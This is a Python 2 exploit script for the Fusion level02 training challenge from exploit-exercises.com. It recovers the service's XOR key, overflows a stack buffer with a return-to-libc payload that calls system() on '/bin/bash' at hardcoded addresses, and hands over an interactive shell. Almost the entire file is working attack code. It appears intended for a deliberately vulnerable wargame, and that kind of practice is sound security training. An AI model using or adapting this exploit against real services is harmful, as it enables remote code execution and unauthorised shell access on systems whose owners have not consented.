#!/usr/bin/env python
#
# http://exploit-exercises.com/fusion/level02
#
# NOTE: If you want to debug level02 you need to 'set follow-fork-mode child'
#	under gdb (after attaching to specific PID).
#
# There are 2 mistakes in this example that lead to exploitable condition:
#	(1) Stack-based buffer overflow in encrypt_file() (line 48)
#	(2) Usage of static variables in cipher()

import sys
import array
import socket
import struct
import telnetlib

def main():
	s = socket.socket()
	s.connect((HOST, PORT))

	print s.recv(1024)

	# Dummy payload to get XOR-ed buffer
	cmd = 'E'
	sz = 128 # Key size in bytes (32*4)
	data = 'A'*sz
	sz = struct.pack("<I", sz)
	payload = cmd + sz + data
	s.send(payload)
	raw_input("Press enter to proceed ") # This is required (sleep also works). Bonus question: Why?
	data = s.recv(1024)
	key = data[-128:] # We're receiving <banner> + <size of buffer> + <XORed buffer>; hence we need to pull out last 128 bytes
	
	# Recovering the key from XOR-ed buffer (XOR-ing with original buffer)
	key = array.array('B', key)
	data = 'A'*128
	data = array.array('B', data)
	for i in range(len(key)):
		key[i] ^= data[i]
	print "[+] Key: " + key.tostring().encode("hex")

	# Actual payload crafting
	cmd = 'E'
	sz = (32*4096)+12
	# <B sled> + SFP + RET<address of system()> + <RET for system()> + <address of system()'s argument> + <argument for system()>
	# Unreliability of this exploit stems from the fact that we use hardcoded addresses in our payload while ASLR is active
	data = 'B' * sz + "ABCD" + "\x20\x8b\x63\xb7" + "ABCD" + "\xe8\x86\xbf\xbf" + "/bin/bash" + '\x00'
	data = array.array('B', data)
	for i in range(len(data)):
		data[i] ^= key[i%128]
	data = data.tostring()
	sz += 26
	sz = struct.pack("<I", sz)
	payload = cmd + sz + data
	s.send(payload)
	raw_input("Press enter to proceed ")
	s.send('Q') # Boom goes the dynamite!

	# Catching our new shell session
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()
	
	s.close()

if __name__ == "__main__":
	if(len(sys.argv) < 2):
		print sys.argv[0] + " <IP>"
		sys.exit(1)
	HOST = sys.argv[1]
	PORT = 20002
	
	main()

